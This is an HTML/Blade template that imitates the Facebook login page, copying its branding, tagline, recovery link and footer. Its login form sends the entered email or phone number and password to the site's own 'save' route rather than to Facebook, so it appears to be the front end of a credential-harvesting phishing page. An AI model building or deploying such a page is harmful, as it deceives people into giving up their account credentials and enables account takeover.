
   
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook-login or sign up</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon"  href="https://upload.wikimedia.org/wikipedia/en/thumb/0/04/Facebook_f_logo_%282021%29.svg/1200px-Facebook_f_logo_%282021%29.svg.png"/>
 <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <main>
        <div class="row">
            <div class="col-logo">
                <img src="images/fb_logo.svg" alt="Logo">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
                 <div class="col-form">
                <div class="form-container">
                <form action="{{Route('save')}}" Method="POST" >
              @csrf
                    <input type="text"name="name" placeholder="Email address or phone number">
                    <input type="password"name="password" placeholder="Password">
                    <button type="submit" class="btn-login">Login</button></form>
                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
                </div> 
            </div>
        </div>
    </main>
    <footer>
        <div class="footer-contents">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">മലയാളം</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><button>+</button></li>
            </ol>

            <ol>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
            </ol>
            <small>Facebook © 2021</small>
        </div>
    </footer>
</body>
</html>